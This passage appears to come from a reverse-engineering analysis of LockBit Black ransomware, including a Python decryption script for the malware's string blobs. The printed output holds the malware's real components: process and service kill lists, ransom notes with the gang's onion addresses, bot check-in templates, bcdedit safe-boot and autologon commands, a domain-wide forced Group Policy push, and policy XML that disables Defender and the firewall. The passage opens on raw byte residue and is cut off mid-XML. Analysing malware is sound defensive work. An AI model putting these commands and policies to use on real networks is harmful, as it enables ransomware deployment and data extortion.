xfc xa1 xf1 x94 xbaJ1 x96 xe2Jq x97 xe2d x00 x1b` xcb x80 x1c xb0 xcb x00 x1e( xcd x00 x1b x80 xd3 xc0 x18` xd5 x80 xab x9e xc9 xc0 x18x xd5 xc0 x18 x98 xd5 x00 x19 xc0 xd5 x00 x190 xdb x80 x1bX xdb xc0 x1b xdd x00 x1c x08 xdd xc0 x1c x18 xdd xc0 x1c x80 xdd xdb xb7kJ xc0 x1c xa8 xdd x00 x1b x98 xdf7x xcaL xc0 x18 xc0 xe1 x80 x1c0 xe3 xc0 x1c x88 xe1 xc0 x1bh xe7 x00 x1d x80 xe7 xc0 x18 x90 xe9 x00 x1a x98 xe9 x00 x1c` xe9@ x1e x98 xe9z x9b. xcd x93 xc5 x16 xaf x00 x1c xc0 xf1 xc0 xd8^ xe1@ x19 xc8 xd9 x00 x1d x08 xd3 xc0 x1cH xdd x00 x19 x10 xe3 x00 x00 x00 x00&#39; 0x67b00e00 : 386 0xc5b01900 : adv string list b&#39;sql&#39; b&#39;oracle&#39; b&#39;ocssd&#39; b&#39;dbsnmp&#39; b&#39;synctime&#39; b&#39;agntsvc&#39; b&#39;isqlplussvc&#39; b&#39;xfssvccon&#39; b&#39;mydesktopservice&#39; b&#39;ocautoupds&#39; b&#39;encsvc&#39; b&#39;firefox&#39; b&#39;tbirdconfig&#39; b&#39;mydesktopqos&#39; b&#39;ocomm&#39; b&#39;dbeng50&#39; b&#39;sqbcoreservice&#39; b&#39;excel&#39; b&#39;infopath&#39; b&#39;msaccess&#39; b&#39;mspub&#39; b&#39;onenote&#39; b&#39;outlook&#39; b&#39;powerpnt&#39; b&#39;steam&#39; b&#39;thebat&#39; b&#39;thunderbird&#39; b&#39;visio&#39; b&#39;winword&#39; b&#39;wordpad&#39; b&#39;notepad&#39; b&#39;&#39; b&#39;&#39; string list b&#39;vss&#39; b&#39;sql&#39; b&#39;svc$&#39; b&#39;memtas&#39; b&#39;mepocs&#39; b&#39;msexchange&#39; b&#39;sophos&#39; b&#39;veeam&#39; b&#39;backup&#39; b&#39;GxVss&#39; b&#39;GxBlr&#39; b&#39;GxFWD&#39; b&#39;GxCVD&#39; b&#39;GxCIMgr&#39; b&#39;&#39; b&#39;&#39; hash list b&#39; xf5 xe26i? x89# xfe xa6+n x11YZa xfb x9e xb1 xcc xacI xcf xc8T2 xe7 x84 x93b x8d x03 xf4e xbc;J&#34;&#34; xa4Px xe6 xe9}&#39; 0x6936e2f5 : 0xfe23893f : 0x116e2ba6 : 0xfb615a59 : 0xacccb19e : 0x54c8cf49 : 0x9384e732 : 0xf4038d62 : 0x4a3bbc65 : 0x50a42222 : 0x7de9e678 : . Encrypted Strings . Along witht the config the .data section contains encrypted data blobs which are preceded by a DWORD containing their length. The blobs use the same seed and PRNG as the config so once that has been extracted from the config each blob can be decrypted. Most of the blobs are strings, but a few of them are data. Some of the larger strings are also compressed using aplib. . data = unhex(&#39;d8e23d69318921fe8a2b6e115e5a35fbaeb1c1ac5ccfc4542be7b3931b8d7af40ebc084a3a22c85058e6907d2286fb5cae0889a99b9c37b100eb7877fc6acda615b2a8b014320d2e4e42ef5bfc427e3cbf60a4e8b215df27c51283c5121ef1d58b0756a9690da293f87fecffc9cf77f99ce44b6e4eed1325a204ebeea91aa9bd310072129baa420e8297e9b72cb704e58c35fa63421ab9b5748c35b8d005cdb6aacfac9f22838aca4b5dbecfa66d35e9f093caa18a8acaab51f334b73ee1fbca5202ad2e499a213f8706716cf55784b4e4c903b05d337fac0e73e1648899e42dd12311290d2bdf65f775f4a56336eaae5e010000&#39;) #aplib_decompress(decrypt(enc_data, data_size, seed)) decrypt(data, seed).replace(b&#39; x00&#39;,b&#39;&#39;) . b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instruction!&#34; x04 xac&#39; . import pefile import struct import hashlib file_data = open(&#39;/tmp/lock3_dump_SCY.bin&#39;, &#39;rb&#39;).read() pe = pefile.PE(data=file_data) section_data = None for s in pe.sections: if b&#39;.data x00&#39; == s.Name[:6]: section_data = s.get_data() ptr = 0 enc_strings = [] while ptr &lt; len(section_data): blob_size = struct.unpack(&#39;&lt;I&#39;, section_data[ptr:ptr+4])[0] if blob_size == 0: break enc_strings.append(section_data[ptr+4:ptr+4+blob_size]) ptr = ptr+4+blob_size ico_magic = b&#39; x00 x00 x01 x00 x03&#39; for e in enc_strings: print(&quot; n&quot;) ptxt_blob = decrypt(e, seed) if is_ascii(ptxt_blob): print(ptxt_blob.replace(b&#39; x00&#39;,b&#39;&#39;)) else: dec_blob = aplib_decompress(ptxt_blob) if len(dec_blob) &lt;= len(ptxt_blob): print(f&quot;** Raw data: {hashlib.sha256(ptxt_blob).hexdigest()}&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(ptxt_blob).hexdigest() + &#39;.bin&#39; open(tmp_filename, &#39;wb&#39;).write(ptxt_blob) elif is_ascii(dec_blob): print(dec_blob.replace(b&#39; x00&#39;,b&#39;&#39;)) elif ico_magic == dec_blob[:len(ico_magic)]: print(&quot;** .ico file&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(dec_blob).hexdigest() + &#39;_ico.bin&#39; open(tmp_filename, &#39;wb&#39;).write(dec_blob) elif dec_blob[:2] == b&#39;MZ&#39;: print(&quot;** PE file&quot;) tmp_filename = &quot;/tmp/&quot; + hashlib.sha256(dec_blob).hexdigest() + &#39;_pe.bin&#39; open(tmp_filename, &#39;wb&#39;).write(dec_blob) else: print(&quot;WTF?? n&quot;) print(dec_blob) . b&#39;LockBit Black r n r nAll your important files are stolen and encrypted! r nYou must find %s file r nand follow the instruction!&#39; b&#39; LockBit Black r n r nAll your important files are stolen and encrypted! r n You must find %s file r n and follow the instruction!&#39; ** Raw data: da2d72e132f9e8706676a72d9bf48a2bd26d9f8014686424ddb927b87637f2a1 ** Raw data: 2df9218c31586e1ce85d989ea97d9e6a6664d4a50b681914a5b6c44064d5c146 ** Raw data: d8dd2530a4b2165f16547c237e43dc15adb6e168af5ae8b153793d7aee863d93 b&#39;LockBit Black Ransomware r n r nYour data are stolen and encrypted r n r nThe data will be published on TOR website r nhttp://lockbitapt2yfbt7lchxejug47kmqvqqxvvjpqkmevv4l3azl3gy6pyd.onion r nand http://lockbitapt.uz if you do not pay the ransom r n r nYou can contact us and decrypt one file for free on these TOR sites r nhttp://lockbitsupa7e3b4pkn4mgkgojrl5iqgx24clbzc4xm7i6jeetsia3qd.onion r nhttp://lockbitsupn2h6be2cnqpvncyhj4rgmnwn44633hnzzmtxdvjoqlp7yd.onion r nhttp://lockbitsupp.uz r n r nDecryption ID: %s&#39; ** .ico file b&#39;&#34;host_hostname&#34;:&#34;%s&#34;, r n&#34;host_user&#34;:&#34;%s&#34;, r n&#34;host_os&#34;:&#34;%s&#34;, r n&#34;host_domain&#34;:&#34;%s&#34;, r n&#34;host_arch&#34;:&#34;%s&#34;, r n&#34;host_lang&#34;:&#34;%s&#34;, r n%s&#39; b&#39;{ r n&#34;disk_name&#34;:&#34;%s&#34;, r n&#34;disk_size&#34;:&#34;%u&#34;, r n&#34;free_size&#34;:&#34;%u&#34; r n}&#39; b&#39;&#34;disks_info&#34;:[ r n%s r n]&#39; b&#39;Mozilla/5.0 (Windows NT 6.1)&#39; b&#39;AppleWebKit/587.38 (KHTML, like Gecko)&#39; b&#39;Chrome/91.0.4472.77&#39; b&#39;Safari/537.36&#39; b&#39;Edge/91.0.864.37&#39; b&#39;Firefox/89.0&#39; b&#39;Gecko/20100101&#39; b&#39; r nAccept: */* r nConnection: keep-alive r nAccept-Encoding: gzip, deflate, br r nContent-Type: text/plain&#39; b&#39;{ r n&#34;bot_version&#34;:&#34;%s&#34;, r n&#34;bot_id&#34;:&#34;%s&#34;, r n&#34;bot_company&#34;:&#34;%.8x%.8x%.8x%.8x%&#34;, r n%s r n}&#39; b&#39;{ r n&#34;bot_version&#34;:&#34;%s&#34;, r n&#34;bot_id&#34;:&#34;%s&#34;, r n&#34;bot_company&#34;:&#34;%.8x%.8x%.8x%.8x%&#34;, r n&#34;stat_all_files&#34;:&#34;%u&#34;, r n&#34;stat_not_encrypted&#34;:&#34;%u&#34;, r n&#34;stat_size&#34;:&#34;%s&#34;, r n&#34;execution_time&#34;:&#34;%u&#34;, r n&#34;start_time&#34;:&#34;%u&#34;, r n&#34;stop_time&#34;:&#34;%u&#34; r n}&#39; ** PE file ** Raw data: 0d2104672c11ff0822bf096e97225ceab74f1e2ecff7a2a6fde152a081b90b87 b&#39;SOFTWARE Policies Microsoft Windows OOBE&#39; b&#39;DisablePrivacyExperience&#39; b&#39;SOFTWARE Microsoft Windows NT CurrentVersion Winlogon&#39; b&#39;AutoAdminLogon&#39; b&#39;DefaultUserName&#39; b&#39;DefaultDomainName&#39; b&#39;DefaultPassword&#39; b&#39;bcdedit /set {current} safeboot network&#39; b&#39;bcdedit /deletevalue {current} safeboot&#39; b&#39;bootcfg /raw /a /safeboot:network /id 1&#39; b&#39;bootcfg /raw /fastdetect /id 1&#39; b&#39;SOFTWARE Microsoft Windows CurrentVersion RunOnce&#39; b&#39;%s -pass %s&#39; ** PE file b&#34;powershell Get-ADComputer -filter * -Searchbase &#39;%s&#39; | Foreach-Object { Invoke-GPUpdate -computer $_.name -force -RandomDelayInMinutes 0}&#34; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;NTServices clsid=&#34;{2CFB484A-4E96-4b5d-A0B6-093D2F91E6AE}&#34;&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLPBDMS&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLPBDMS&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLPBENGINE&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLPBENGINE&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLFDLauncher&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; userContext=&#34;0&#34; removePolicy=&#34;0&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLFDLauncher&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLSERVERAGENT&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLSERVERAGENT&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLServerOLAPService&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLServerOLAPService&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSASTELEMETRY&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSASTELEMETRY&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLBrowser&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLBrowser&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQL Server Distributed Replay Client&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQL Server Distributed Replay Client&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQL Server Distributed Replay Controller&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQL Server Distributed Replay Controller&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MsDtsServer150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MsDtsServer150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISTELEMETRY150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISTELEMETRY150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISScaleOutMaster150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISScaleOutMaster150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SSISScaleOutWorker150&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SSISScaleOutWorker150&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLLaunchpad&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLLaunchpad&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLWriter&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLWriter&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;SQLTELEMETRY&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;SQLTELEMETRY&#34; serviceAction=&#34;STOP&#34; timeout=&#34;30&#34;/&gt;&lt;/NTService&gt; r n t&lt;NTService clsid=&#34;{AB6F0B67-341F-4e51-92F9-005FBFBA1A43}&#34; name=&#34;MSSQLSERVER&#34; image=&#34;4&#34; changed=&#34;%s&#34; uid=&#34;%s&#34; disabled=&#34;0&#34;&gt;&lt;Properties startupType=&#34;DISABLED&#34; serviceName=&#34;MSSQLSERVER&#34; serviceAction=&#34;STOP&#34; timeout=&#34;60&#34;/&gt;&lt;/NTService&gt; r n&lt;/NTServices&gt; r n&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;Files clsid=&#34;{215B2E53-57CE-475c-80FE-9EEC14635851}&#34;&gt; r n t&lt;File clsid=&#34;{50BE44C8-567A-4ed1-B1D0-9234FE1F38AF}&#34; name=&#34;%s&#34; status=&#34;%s&#34; image=&#34;2&#34; bypassErrors=&#34;1&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt; r n t&lt;Properties action=&#34;U&#34; fromPath=&#34;%s&#34; targetPath=&#34;%s&#34; readOnly=&#34;0&#34; archive=&#34;1&#34; hidden=&#34;0&#34; suppress=&#34;0&#34;/&gt; r n t&lt;/File&gt; r n&lt;/Files&gt; r n&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;ScheduledTasks clsid=&#34;{CC63F200-7309-4ba0-B154-A71CD118DBCC}&#34;&gt; r n t&lt;TaskV2 clsid=&#34;{D8896631-B747-47a7-84A6-C155337F3BC8}&#34; name=&#34;%s&#34; image=&#34;2&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%s&#34; runAs=&#34;%s&#34; logonType=&#34;InteractiveToken&#34;&gt;&lt;Task version=&#34;1.2&#34;&gt;&lt;RegistrationInfo&gt;&lt;Author&gt;%s&lt;/Author&gt;&lt;Description&gt;&lt;/Description&gt;&lt;/RegistrationInfo&gt;&lt;Principals&gt;&lt;Principal id=&#34;Author&#34;&gt;&lt;UserId&gt;%s&lt;/UserId&gt;&lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;&lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;&lt;/Principal&gt;&lt;/Principals&gt;&lt;Settings&gt;&lt;IdleSettings&gt;&lt;Duration&gt;PT10M&lt;/Duration&gt;&lt;WaitTimeout&gt;PT1H&lt;/WaitTimeout&gt;&lt;StopOnIdleEnd&gt;false&lt;/StopOnIdleEnd&gt;&lt;RestartOnIdle&gt;false&lt;/RestartOnIdle&gt;&lt;/IdleSettings&gt;&lt;MultipleInstancesPolicy&gt;IgnoreNew&lt;/MultipleInstancesPolicy&gt;&lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;&lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;&lt;AllowHardTerminate&gt;true&lt;/AllowHardTerminate&gt;&lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;Hidden&gt;false&lt;/Hidden&gt;&lt;ExecutionTimeLimit&gt;P3D&lt;/ExecutionTimeLimit&gt;&lt;Priority&gt;7&lt;/Priority&gt;&lt;/Settings&gt;&lt;Triggers&gt;&lt;RegistrationTrigger&gt;&lt;Enabled&gt;true&lt;/Enabled&gt;&lt;/RegistrationTrigger&gt;&lt;/Triggers&gt;&lt;Actions Context=&#34;Author&#34;&gt;&lt;Exec&gt;&lt;Command&gt;%s&lt;/Command&gt;&lt;Arguments&gt;%s&lt;/Arguments&gt;&lt;/Exec&gt;&lt;/Actions&gt;&lt;/Task&gt;&lt;/Properties&gt;&lt;/TaskV2&gt; r n&lt;/ScheduledTasks&gt; r n&#39; b&#39;PReg x01[SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeDC; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeOffsetDC; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTime; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;GroupPolicyRefreshTimeOffset; x04; x04; x01][SOFTWARE Policies Microsoft Windows System;EnableSmartScreen; x04; x04;][SOFTWARE Policies Microsoft Windows System;**del.ShellSmartScreenLevel; x01; x04; ][SOFTWARE Policies Microsoft Windows Defender;DisableAntiSpyware; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender;DisableRoutinelyTakingAction; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Real-Time Protection;DisableRealtimeMonitoring; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Real-Time Protection;DisableBehaviorMonitoring; x04; x04; x01][SOFTWARE Policies Microsoft Windows Defender Spynet;SubmitSamplesConsent; x04; x04; x02][SOFTWARE Policies Microsoft Windows Defender Spynet;SpynetReporting; x04; x04;][SOFTWARE Policies Microsoft WindowsFirewall DomainProfile;EnableFirewall; x04; x04;][SOFTWARE Policies Microsoft WindowsFirewall StandardProfile;EnableFirewall; x04; x04;]&#39; WTF?? b&#39; xef xbb xbf&lt;?xml version= &#39;1.0 &#39; encoding= &#39;utf-8 &#39;?&gt; r n&lt;policyComments xmlns:xsd=&#34;http://www.w3.org/2001/XMLSchema&#34; xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34; revision=&#34;1.0&#34; schemaVersion=&#34;1.0&#34; xmlns=&#34;http://www.microsoft.com/GroupPolicy/CommentDefinitions&#34;&gt; r n &lt;policyNamespaces&gt; r n &lt;using prefix=&#34;ns0&#34; namespace=&#34;Microsoft.Policies.GroupPolicy&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns1&#34; namespace=&#34;Microsoft.Policies.SmartScreen&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns2&#34; namespace=&#34;Microsoft.Policies.WindowsDefender&#34;&gt;&lt;/using&gt; r n &lt;using prefix=&#34;ns3&#34; namespace=&#34;Microsoft.Policies.WindowsFirewall&#34;&gt;&lt;/using&gt; r n &lt;/policyNamespaces&gt; r n &lt;comments&gt; r n &lt;admTemplate&gt;&lt;/admTemplate&gt; r n &lt;/comments&gt; r n &lt;resources minRequiredRevision=&#34;1.0&#34;&gt; r n &lt;stringTable&gt;&lt;/stringTable&gt; r n &lt;/resources&gt; r n&lt;/policyComments&gt;&#39; b&#39;&lt;?xml version=&#34;1.0&#34; encoding=&#34;utf-8&#34;?&gt; r n&lt;NetworkShareSettings clsid=&#34;{520870D8-A6E7-47e8-A8D8-E6A4E76EAEC2}&#34;&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_D&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_D&#34; path=&#34;D:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_E&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_E&#34; path=&#34;E:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_F&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_F&#34; path=&#34;F:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_G&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_G&#34; path=&#34;G:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_H&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_H&#34; path=&#34;H:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_I&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_I&#34; path=&#34;I:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_J&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_J&#34; path=&#34;J:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_K&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_K&#34; path=&#34;K:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_L&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_L&#34; path=&#34;L:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_M&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_M&#34; path=&#34;M:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_N&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_N&#34; path=&#34;N:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; allAdminDrive=&#34;0&#34; limitUsers=&#34;NO_CHANGE&#34; abe=&#34;NO_CHANGE&#34;/&gt;&lt;/NetShare&gt; r n t&lt;NetShare clsid=&#34;{2888C5E7-94FC-4739-90AA-2C1536D68BC0}&#34; image=&#34;2&#34; name=&#34;%%ComputerName%%_O&#34; changed=&#34;%s&#34; uid=&#34;%s&#34;&gt;&lt;Properties action=&#34;U&#34; name=&#34;%%ComputerName%%_O&#34; path=&#34;O:&#34; comment=&#34;&#34; allRegular=&#34;0&#34; allHidden=&#34;0&#34; 